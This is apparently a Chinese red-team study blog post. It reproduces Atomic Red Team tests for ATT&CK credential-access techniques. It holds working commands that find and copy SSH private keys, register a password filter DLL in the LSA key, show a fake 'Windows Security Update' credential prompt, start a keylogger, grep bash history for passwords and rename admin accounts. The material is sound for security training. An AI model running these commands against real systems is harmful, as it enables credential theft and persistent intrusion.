---
layout: post
title: 跟着ATT&CK学安全之credential-access
excerpt: "跟着ATT&CK学安全之credential-access"
categories: [ATT&CK]
comments: true
---
#### T1145 - Private Keys
私钥和证书可以进行权限验证,加解密进行数字签名.攻击者可用这些进行权限维持或者解密文件.通常密钥和证书的后缀是`.key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. `

私钥一般需要密码和口令来操作,所以红队可以使用工具进行键盘记录或者爆破密码
###### 测试1 Private Keys
在windows中查找`.key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc`后缀的文件名
```
echo "ATOMICREDTEAM" > %windir%\cert.key
dir c:\ /b /s .key | findstr /e .key
```
win10成功复现
###### 测试2 Discover Private SSH Keys
在linux中查找ssh私钥
```
find / -name id_rsa >> #{output_file}
find / -name id_dsa >> #{output_file}
```
成功复现
###### 测试3 Copy Private SSH Keys with CP
```
mkdir #{output_folder}
find / -name id_rsa -exec cp --parents {} #{output_folder} \;
find / -name id_dsa -exec cp --parents {} #{output_folder} \;
```
成功复现
###### 测试4 Copy Private SSH Keys with rsync
```
mkdir #{output_folder}
find / -name id_rsa -exec rsync -R {} #{output_folder} \;
find / -name id_dsa -exec rsync -R {} #{output_folder} \;
```
成功复现
### T1174 - Password Filter DLL
Windows password filters对于本地和域账户来说都是一种密码校验的机制,Filters使用dll作为接口,来进行密码规则的校验.Filter Dll在本地电脑对本地账户或者域控管理者进行校验.

在使用Security Accounts Manager注册新的密码之前, Local Security Authority向registered filter请求验证,当验证通过才能进行密码修改

红队可以注册一个有害的password filters来危害本地电脑或者真个域控
###### 测试1 Install and Register Password Filter DLL
使用powershell来安装注册password filter DLL,同时需要administrative权限和重启
```
$passwordFilterName = (Copy-Item "#{input_dll}" -Destination "C:\Windows\System32" -PassThru).basename
$lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
$notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
$notificationPackagesValues += $passwordFilterName
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues
Restart-Computer -Confirm
```
**项目中缺少文件,没有复现**
### T1040 - Network Sniffing
这个没什么说的,就是抓流量
###### 测试1 Packet Capture Linux
```
tcpdump -c 5 -nnni #{interface}
tshark -c 5 -i #{interface}
```
成功复现
###### 测试2 Packet Capture Windows Command Prompt
```
tcpdump -c 5 -nnni #{interface}
tshark -c 5 -i #{interface}
```
成功复现
### T1141 - Input Prompt
当程序被运行后需要额外的权限的时候,系统会向用户索要额外的权限凭证.红队可模仿这个方法,向用户索要额外的权限凭证.并记录下来
###### 测试1 PowerShell - Prompt User for Password
在powershell中运行
```
# Creates GUI to prompt for password. Expect long pause before prompt is available.    
$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)
# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.
write-warning $cred.GetNetworkCredential().Password
```
ps:效果相当好啊!!!

win10成功复现
### T1056 - Input Capture
Keylogging 是最常用的input caputure手段
###### 测试1 Input Capture
```
set-ExecutionPolicy RemoteSigned
.\T1056\src\Get-Keystrokes.ps1 -LogPath #{filepath}
```
没有成功,回家再试一下
### T1139 - Bash History
红队可以从`~/.bash_history`找一些敏感信息
###### 测试1 Search Through Bash History
```
cat #{bash_history_filename} | grep #{bash_history_grep_args}
例如
cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh'
```
成功复现
### T1098 - Account Manipulation
帐户操作可以帮助对手维护对环境中的凭据和特定权限级别的访问。修改包括修改凭证,修改权限,添加组,修改账户设置或者修改验证方式.为了修改账户,红队必须首先获得这个操作系统的权限.

对于Exchange Email Account Takeover:允许在本地 Exchange 和基于云的服务中可用,其中Exchange Server 是微软公司的一套电子邮件服务组件，是个消息与协作系统。 简单而言，Exchange server可以被用来构架应用于企业、学校的邮件系统。

对于Azure AD:红队可以设置第二个密码来persistence

对于AWS:AWS通过账户名新人用户.
###### 测试1 Admin Account Manipulate
修改账户名称
```
$x = Get-Random -Minimum 2 -Maximum 9999
$y = Get-Random -Minimum 2 -Maximum 9999
$z = Get-Random -Minimum 2 -Maximum 9999
$w = Get-Random -Minimum 2 -Maximum 9999
Write-Host HaHaHa_$x$y$z$w

$hostname = (Get-CIMInstance CIM_ComputerSystem).Name

$fmm = Get-CimInstance -ClassName win32_group -Filter "name = 'Administrators'" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name

foreach($member in $fmm) {
    if($member -like "*Administrator*") {
        Rename-LocalUser -Name $member.Name -NewName "HaHaHa_$x$y$z$w"
        Write-Host "Successfully Renamed Administrator Account on" $hostname
        }
    }
```
没有复现
### T1110 - Brute Force
没什么说的,就是爆破